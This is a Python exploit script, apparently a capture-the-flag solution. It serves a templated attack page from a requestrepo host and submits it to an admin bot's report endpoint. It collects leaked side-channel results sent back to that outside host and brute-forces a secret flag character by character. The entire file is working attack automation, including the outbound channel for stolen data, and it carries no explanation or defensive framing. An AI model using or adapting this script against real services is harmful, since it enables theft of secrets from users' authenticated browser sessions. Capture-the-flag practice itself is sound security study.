import sys
import typer
import json
import string
import requests
from pathlib import Path
from requestrepo import RequestRepo, RequestRepoTimeoutError

#BOT_URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:9000/"
ATTACK_HTML = Path(__file__).with_name("index.html").read_text()
app = typer.Typer()

def weak(data: dict, min_verify_hits: int, min_verify_gap: int) -> bool:
    return data["h"] < min_verify_hits or data["h"] < data["m"] + min_verify_gap

def pick(hits: dict[str, int], trials: dict[str, int], votes: dict[str, int], charset: str) -> list[str]:
    order = {ch: i for i, ch in enumerate(charset)}
    return sorted(
        charset,
        key=lambda ch: (
            hits[ch] / trials[ch] if trials[ch] else 0.0,
            votes[ch],
            -order[ch],
        ),
        reverse=True,
    )

@app.command()
def main(
    bot_url: str = "http://127.0.0.1:9000",
    app_url: str = "http://web:8000",
    requestrepo_token: str = "",
    prefix: str = "TRX{",
    charset: str = string.ascii_lowercase + string.digits + "_}",
    rounds: int = 12,
    calibration_rounds: int = 5,
    verify_rounds: int = 8,
    min_reports: int = 1,
    min_winner_votes: int = 2,
    min_rate_gap: float = 0.08,
    min_verify_gap: int = 2,
    min_verify_hits: int = 4,
    visit_timeout: int = 180,
    stop_delays: list[int] = typer.Option([6, 7, 8]),
    expected_flag: str = "",
) -> None:
    session = requests.Session()
    with RequestRepo(token=requestrepo_token) as repo:
        repo.set_response("/result", "ok")
        while not prefix.endswith("}"):
            hits = {ch: 0 for ch in charset}
            trials = {ch: 0 for ch in charset}
            votes = {ch: 0 for ch in charset}
            reports = 0

            while True:
                repo.clear_requests()
                body = (
                    ATTACK_HTML
                    .replace("__APP_URL__", json.dumps(app_url.rstrip("/") + "/"))
                    .replace("__PREFIX__", json.dumps(prefix))
                    .replace("__CHARSET__", json.dumps(list(charset)))
                    .replace("__ROUNDS__", str(rounds))
                    .replace("__CALIBRATION_ROUNDS__", str(calibration_rounds))
                    .replace("__VERIFY_ROUNDS__", str(verify_rounds))
                    .replace("__STOP_DELAYS__", json.dumps(stop_delays))
                )
                repo.set_response(
                    "/index.html",
                    body,
                    headers={"Content-Type": "text/html; charset=utf-8"},
                )
                print(f"[+] report {prefix} -> {repo.url}/index.html", flush=True)
                session.post(f"{bot_url}/report", json={"url": f"{repo.url}/index.html"}, timeout=10).raise_for_status()

                try:
                    req = repo.wait_for_http(timeout=visit_timeout, path="/result")
                except RequestRepoTimeoutError:
                    print("[*] timed out", flush=True)
                    continue

                data = req.json()
                if data.get("p") != prefix or weak(data, min_verify_hits, min_verify_gap):
                    print(f"[*] discarded {data}", flush=True)
                    continue

                order = {ch: i for i, ch in enumerate(charset)}
                winner = max(charset, key=lambda ch: (int(data["s"].get(ch, 0)), -order[ch]))
                reports += 1
                votes[winner] += 1
                for ch in charset:
                    hits[ch] += int(data["s"].get(ch, 0))
                    trials[ch] += int(data["r"])

                ranked = pick(hits, trials, votes, charset)
                a, b = ranked[:2]
                ar = hits[a] / trials[a]
                br = hits[b] / trials[b]
                print(
                    f"[+] {prefix!r} delay={data['d']} verify={data['h']}/{data['m']} "
                    f"winner={winner!r} top={a!r}:{ar:.3f} second={b!r}:{br:.3f}",
                    flush=True,
                )
                if reports < min_reports or votes[a] < min_winner_votes or votes[a] <= votes[b] or ar - br < min_rate_gap:
                    continue

                prefix += a
                if expected_flag and not expected_flag.startswith(prefix):
                    raise SystemExit(f"wrong guess: {prefix}")
                print(f"[+] prefix: {prefix}", flush=True)
                break
    return prefix

if __name__ == "__main__":
    app()
